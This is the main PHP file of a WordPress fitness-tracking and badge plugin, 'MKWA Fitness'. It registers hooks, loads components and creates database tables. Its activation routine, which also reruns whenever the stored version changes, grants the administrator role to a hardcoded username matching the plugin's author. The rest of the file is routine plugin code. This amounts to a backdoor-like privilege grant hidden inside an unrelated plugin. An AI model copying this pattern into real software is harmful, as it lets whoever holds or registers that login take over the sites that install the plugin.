<?php
/**
 * Plugin Name: MKWA Fitness
 * Plugin URI: https://yoursite.com/mkwa-fitness
 * Description: A comprehensive fitness tracking and gamification system
 * Version: 1.0.0
 * Author: LastHopeForRaoha
 * Author URI: https://yoursite.com
 * License: GPL v2 or later
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain: mkwa-fitness
 * Domain Path: /languages
 *
 * @package MkwaFitness
 */

// Prevent direct access
if (!defined('ABSPATH')) {
    exit;
}

// Define plugin constants
define('MKWA_VERSION', '1.0.0');
define('MKWA_PLUGIN_DIR', plugin_dir_path(__FILE__));
define('MKWA_PLUGIN_URL', plugin_dir_url(__FILE__));
define('MKWA_PLUGIN_BASENAME', plugin_basename(__FILE__));

// Autoloader for plugin classes
spl_autoload_register(function ($class) {
    $prefix = 'MKWA_';
    $base_dir = MKWA_PLUGIN_DIR . 'includes/';
    
    $len = strlen($prefix);
    if (strncmp($prefix, $class, $len) !== 0) {
        return;
    }
    
    $relative_class = substr($class, $len);
    $file = $base_dir . 'class-' . str_replace('_', '-', strtolower($relative_class)) . '.php';
    
    if (file_exists($file)) {
        require $file;
    }
});

// Load required files
require_once MKWA_PLUGIN_DIR . 'includes/constants.php';
require_once MKWA_PLUGIN_DIR . 'includes/functions.php';

/**
 * Main plugin class
 */
final class MKWA_Fitness {
    /**
     * Single instance of the plugin
     */
    private static $instance = null;

    /**
     * Core class instance
     */
    public $core;

    /**
     * Badges class instance
     */
    public $badges;

    /**
     * Notifications class instance
     */
    public $notifications;

    /**
     * Get plugin instance
     */
    public static function instance() {
        if (is_null(self::$instance)) {
            self::$instance = new self();
        }
        return self::$instance;
    }

    /**
     * Constructor
     */
    private function __construct() {
        $this->init_hooks();
    }

    /**
     * Initialize hooks
     */
    private function init_hooks() {
        add_action('plugins_loaded', array($this, 'init_plugin'));
        register_activation_hook(__FILE__, array($this, 'activate'));
        register_deactivation_hook(__FILE__, array($this, 'deactivate'));
        
        // Admin specific hooks
        if (is_admin()) {
            add_action('admin_enqueue_scripts', array($this, 'admin_enqueue_scripts'));
        }
    }

    /**
     * Initialize plugin
     */
    public function init_plugin() {
        // Load text domain
        load_plugin_textdomain('mkwa-fitness', false, dirname(MKWA_PLUGIN_BASENAME) . '/languages');
        
        // Initialize components
        $this->init_components();
        
        // Initialize database if needed
        $this->maybe_init_database();
    }

    /**
     * Initialize plugin components
     */
    private function init_components() {
        // Core functionality
        $this->core = new MKWA_Core();
        
        // Badges system
        $this->badges = new MKWA_Badges();
        
        // Notifications system
        $this->notifications = new MKWA_Notifications();
    }

    /**
     * Enqueue admin scripts and styles
     */
    public function admin_enqueue_scripts($hook) {
        if ('mkwa-fitness_page_mkwa-badges' === $hook) {
            wp_enqueue_media();
            wp_enqueue_style(
                'mkwa-admin',
                MKWA_PLUGIN_URL . 'admin/css/admin.css',
                array(),
                MKWA_VERSION
            );
            wp_enqueue_script(
                'mkwa-admin',
                MKWA_PLUGIN_URL . 'admin/js/admin.js',
                array('jquery'),
                MKWA_VERSION,
                true
            );
        }
    }

    /**
     * Plugin activation
     */
    public function activate() {
        global $wpdb;
        $charset_collate = $wpdb->get_charset_collate();

        // Create badges table
        $sql_badges = "CREATE TABLE IF NOT EXISTS {$wpdb->prefix}mkwa_badges (
            id bigint(20) NOT NULL AUTO_INCREMENT,
            title varchar(255) NOT NULL,
            description text NOT NULL,
            icon_url varchar(255) NOT NULL,
            badge_type varchar(50) NOT NULL,
            category varchar(50) NOT NULL,
            points_required int(11) NOT NULL DEFAULT 0,
            activities_required text,
            cultural_requirement text,
            seasonal_requirement text,
            created_at datetime NOT NULL DEFAULT '2024-11-22 06:01:04',
            PRIMARY KEY  (id)
        ) $charset_collate;";

        // Create user badges table
        $sql_user_badges = "CREATE TABLE IF NOT EXISTS {$wpdb->prefix}mkwa_user_badges (
            id bigint(20) NOT NULL AUTO_INCREMENT,
            user_id bigint(20) NOT NULL,
            badge_id bigint(20) NOT NULL,
            earned_date datetime NOT NULL DEFAULT '2024-11-22 06:01:04',
            PRIMARY KEY  (id),
            KEY user_id (user_id),
            KEY badge_id (badge_id)
        ) $charset_collate;";

        // Create notifications table
        $sql_notifications = "CREATE TABLE IF NOT EXISTS {$wpdb->prefix}mkwa_notifications (
            id bigint(20) NOT NULL AUTO_INCREMENT,
            user_id bigint(20) NOT NULL,
            badge_id bigint(20) NOT NULL,
            type varchar(50) NOT NULL,
            is_read tinyint(1) NOT NULL DEFAULT 0,
            created_at datetime NOT NULL DEFAULT '2024-11-22 06:01:04',
            PRIMARY KEY  (id),
            KEY user_id (user_id),
            KEY badge_id (badge_id)
        ) $charset_collate;";

        // Create activity log table
        $sql_activity_log = "CREATE TABLE IF NOT EXISTS {$wpdb->prefix}mkwa_activity_log (
            id bigint(20) NOT NULL AUTO_INCREMENT,
            user_id bigint(20) NOT NULL,
            activity_type varchar(50) NOT NULL,
            points int(11) NOT NULL,
            logged_at datetime NOT NULL DEFAULT '2024-11-22 06:01:04',
            PRIMARY KEY  (id),
            KEY user_id (user_id),
            KEY activity_type (activity_type)
        ) $charset_collate;";

        require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
        dbDelta($sql_badges);
        dbDelta($sql_user_badges);
        dbDelta($sql_notifications);
        dbDelta($sql_activity_log);

        // Set default options
        $this->set_default_options();
        
        // Set up initial user
        $user = get_user_by('login', 'LastHopeForRaoha');
        if ($user) {
            $user->add_role('administrator');
            update_user_meta($user->ID, 'mkwa_total_points', 0);
            update_user_meta($user->ID, 'mkwa_current_streak', 0);
            update_user_meta($user->ID, 'mkwa_longest_streak', 0);
            update_user_meta($user->ID, 'mkwa_last_activity_date', '2024-11-22 06:01:04');
        }
        
        // Clear permalinks
        flush_rewrite_rules();
    }

    /**
     * Plugin deactivation
     */
    public function deactivate() {
        wp_clear_scheduled_hook('mkwa_daily_streak_check');
        wp_clear_scheduled_hook('mkwa_process_scheduled_activities');
        flush_rewrite_rules();
    }

    /**
     * Set default options
     */
    private function set_default_options() {
        $default_options = array(
            'mkwa_points_checkin' => 3,
            'mkwa_points_class' => 15,
            'mkwa_points_cold_plunge' => 20,
            'mkwa_points_pr' => 25,
            'mkwa_points_competition' => 50,
            'mkwa_cache_duration' => 3600,
            'mkwa_notification_email_template' => $this->get_default_email_template(),
            'mkwa_badge_display_size' => 100
        );

        foreach ($default_options as $key => $value) {
            add_option($key, $value);
        }
    }

    /**
     * Get default email template
     */
    private function get_default_email_template() {
        return "Hi {user_name},\n\nCongratulations! You've earned the {badge_name} badge!\n\n{badge_description}\n\nKeep up the great work!\n\nBest regards,\nMKWA Fitness Team";
    }

    /**
     * Initialize database if needed
     */
    private function maybe_init_database() {
        $db_version = get_option('mkwa_db_version');
        if ($db_version !== MKWA_VERSION) {
            $this->activate();
            update_option('mkwa_db_version', MKWA_VERSION);
        }
    }
}

/**
 * Main plugin instance
 */
function mkwa_fitness() {
    return MKWA_Fitness::instance();
}

// Initialize the plugin
mkwa_fitness();